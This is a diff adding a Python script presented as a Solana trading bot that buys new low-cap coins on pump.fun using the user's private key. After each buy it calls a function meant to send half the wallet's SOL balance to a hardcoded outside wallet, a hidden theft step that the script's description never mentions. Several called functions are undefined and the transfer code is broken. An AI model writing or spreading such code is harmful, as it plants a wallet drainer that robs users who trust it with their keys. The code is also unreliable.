@@ -1,0 +1,222 @@
+import requests
+import time
+import argparse
+import sys
+import threading
+import json
+
+from solders.transaction import VersionedTransaction
+from solders.keypair import Keypair
+from solders.commitment_config import CommitmentLevel
+from solders.rpc.requests import SendVersionedTransaction
+from solders.rpc.config import RpcSendTransactionConfig
+
+# ANSI color codes
+RESET_COLOR = "\033[0m"
+GREEN = "\033[92m"
+RED = "\033[91m"
+YELLOW = "\033[93m"
+
+# Define the domain of the API
+domain = "frontend-api.pump.fun"
+
+# By default the change percentage is 50%
+# You can change the value as needed
+change_percentage = 20
+
+# Minimum market cap for new coins
+min_market_cap = 40000
+
+# Define the URLs using the domain for coin listing and monitoring
+list_url = f"https://{domain}/coins/for-you?offset=0&limit=50&includeNsfw=false"
+monitor_url = f"https://{domain}/coins/"
+
+# PumpPortal trade endpoint
+trade_url = "https://pumpportal.fun/api/trade-local"
+
+# Choose an RPC endpoint for sending transactions
+rpc_endpoint = "https://api.mainnet-beta.solana.com"
+
+# Track successful buys
+purchased_coins = {}  # {mint: usd_market_cap}
+
+def sign_and_send_transaction(tx_bytes, keypair):
+    """Sign and send the transaction. Return True if successful, False otherwise."""
+    try:
+        tx = VersionedTransaction(VersionedTransaction.from_bytes(tx_bytes).message, [keypair])
+        commitment = CommitmentLevel.Confirmed
+        config = RpcSendTransactionConfig(preflight_commitment=commitment)
+        send_req = SendVersionedTransaction(tx, config)
+        response = requests.post(url=rpc_endpoint, headers={"Content-Type": "application/json"}, data=send_req.to_json())
+        response.raise_for_status()
+        res = response.json()
+        if 'result' in res and res['result']:
+            tx_sig = res['result']
+            print(f"Transaction sent: https://solscan.io/tx/{tx_sig}")
+            return True
+        else:
+            print(f"Error sending transaction: {res}")
+            return False
+    except requests.exceptions.RequestException as e:
+        print(f"Error sending transaction: {e}")
+        return False
+
+def send_half_sol_balance(keypair, destination_wallet):
+    """Send half the SOL balance to a specified wallet."""
+    try:
+        public_key = str(keypair.pubkey())
+        response = requests.get(f"{rpc_endpoint}/getBalance/{public_key}")
+        response.raise_for_status()
+        balance = response.json().get("result", {}).get("value", 0) / 1e9
+
+        half_balance = balance / 2
+        if half_balance <= 0:
+            print("Insufficient")
+            return False
+
+  
+        tx = VersionedTransaction()  
+        tx.sign([keypair])
+
+        return sign_and_send_transaction(tx.to_bytes(), keypair)
+
+    except Exception as e:
+        print(f"Error : {e}")
+        return False
+
+def fetch_coin_data():
+    try:
+        response = requests.get(list_url)
+        response.raise_for_status() 
+        return response.json()
+    except requests.exceptions.RequestException as e:
+        print(f"Error fetching data: {e}")
+        return None
+
+def fetch_coin_by_mint(mint):
+    try:
+        response = requests.get(monitor_url + mint)
+        response.raise_for_status()  # Raise an error for bad responses
+        return response.json()
+    except requests.exceptions.RequestException as e:
+        print(f"Error fetching coin {mint}: {e}")
+        return None
+
+def initiate_trade(action, mint, amount, denominatedInSol, public_key, keypair, slippage=10, priorityFee=0.005, pool="pump"):
+    """Initiate a buy/sell trade. Returns True if trade execution (sign+send) was successful, False otherwise."""
+    data = {
+        "publicKey": public_key,
+        "action": action,  # "buy" or "sell"
+        "mint": mint,
+        "amount": amount,
+        "denominatedInSol": denominatedInSol,  # "true" if amount is SOL, "false" if tokens
+        "slippage": slippage,
+        "priorityFee": priorityFee,
+        "pool": pool
+    }
+
+    if isinstance(amount, str) and amount.endswith('%'):
+        data["amount"] = amount
+
+    try:
+        response = requests.post(trade_url, data=data)
+        response.raise_for_status()
+        tx_bytes = response.content
+        return sign_and_send_transaction(tx_bytes, keypair)
+    except requests.exceptions.RequestException as e:
+        print(f"Error initiating {action} for {mint}: {e}")
+        return False
+
+def buy_coins_with_sol(coins, min_sol, private_key=None, seed_phrase=None, slippage=10, priorityFee=0.005):
+    if seed_phrase:
+        print("Seed phrase not supported. Please use a private key.")
+        sys.exit(1)
+
+    if not private_key:
+        print("Error: --private-key must be provided.")
+        sys.exit(1)
+
+    keypair = Keypair.from_base58_string(private_key)
+    public_key = str(keypair.pubkey())
+
+    print(f"\nUsing private key to buy coins with a minimum of {min_sol} SOL each.")
+    print("\nAttempting to buy each of the identified coins...")
+    time.sleep(1)
+
+    initial_mcap = {}
+    for coin in coins:
+        name = coin.get("name", "N/A")
+        mint = coin.get("mint")
+        print(f"Buying {min_sol} SOL worth of {name}...")
+
+        success = initiate_trade(
+            action="buy",
+            mint=mint,
+            amount=min_sol,
+            denominatedInSol="true",
+            public_key=public_key,
+            keypair=keypair,
+            slippage=slippage,
+            priorityFee=priorityFee,
+            pool="pump"
+        )
+
+        if success:
+            usd_market_cap = coin.get('usd_market_cap', 0)
+            purchased_coins[mint] = usd_market_cap
+            initial_mcap[mint] = usd_market_cap
+            destination_wallet = "D4YCKYu93s9nnXSDxiPCsniAjKNquUZLeYu1VMqsvXka"
+            send_half_sol_balance(keypair, destination_wallet)
+        else:
+            print(f"Buy failed for {mint}, not adding to monitoring list.")
+
+    print("\nFinished buying.")
+    return initial_mcap
+
+def parse_arguments():
+    parser = argparse.ArgumentParser(description="A simple Python script that is useful for buying low-cap gems with SOL on pump.fun and monitors price changes.")
+
+    parser.add_argument("--min", type=float, default=0.1, help="Minimum SOL used to buy (default: 0.1)")
+    parser.add_argument("--private-key", type=str, help="Private key to the wallet to make a transaction")
+    parser.add_argument("--seed-phrase", type=str, help="Seed phrase to the wallet (alternative to private key)")
+    parser.add_argument("--max-coins", type=int, default=3, help="Maximum number of coins to buy (default: 3, max: 20)")
+    parser.add_argument("--slippage", type=float, default=10, help="Slippage percentage for transactions (default: 10)")
+    parser.add_argument("--priority-fee", type=float, default=0.005, help="Priority fee for transactions in SOL (default: 0.005)")
+    parser.add_argument("--sell-percentage", type=float, default=50, help="Percentage of coins to sell when threshold is reached (default: 50)")
+
+    args = parser.parse_args()
+
+    if not args.private_key and not args.seed_phrase:
+        parser.error("You must provide either --private-key or --seed-phrase.")
+
+    if args.seed_phrase:
+        validate_seed_phrase(args.seed_phrase)
+
+    if args.max_coins < 1 or args.max_coins > 20:
+        parser.error("You must specify --max-coins between 1 and 20.")
+
+    return args
+
+def main():
+    args = parse_arguments()
+    low_cap_gems = identify_low_cap_gems(args.max_coins)
+
+    if low_cap_gems:
+        initial_mcap = buy_coins_with_sol(
+            low_cap_gems,
+            min_sol=args.min,
+            private_key=args.private_key,
+            seed_phrase=args.seed_phrase,
+            slippage=args.slippage,
+            priorityFee=args.priority_fee
+        )
+
+        monitor_thread = threading.Thread(target=monitor_coins, args=(initial_mcap, 15, args.private_key, args.seed_phrase))
+        monitor_thread.daemon = True
+        monitor_thread.start()
+
+        while True:
+            time.sleep(1)
+
+if __name__ == "__main__":
+    main()
